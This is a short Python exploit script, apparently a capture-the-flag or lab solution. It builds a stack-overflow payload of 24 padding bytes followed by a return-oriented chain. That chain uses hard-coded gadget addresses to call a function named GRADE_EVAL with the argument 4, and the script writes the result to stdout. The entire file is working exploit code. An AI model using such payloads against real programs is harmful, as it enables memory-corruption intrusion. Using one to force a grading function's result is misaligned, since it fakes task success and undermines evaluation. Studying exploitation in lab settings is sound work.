#!/usr/bin/env python3
import struct
import sys

POP_RDI = 0x401A33
RET = 0x401A34
GRADE_EVAL = 0x401978

payload = b"\x90" * 24
payload += struct.pack("<Q", RET)
payload += struct.pack("<Q", POP_RDI)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", GRADE_EVAL)

sys.stdout.buffer.write(payload)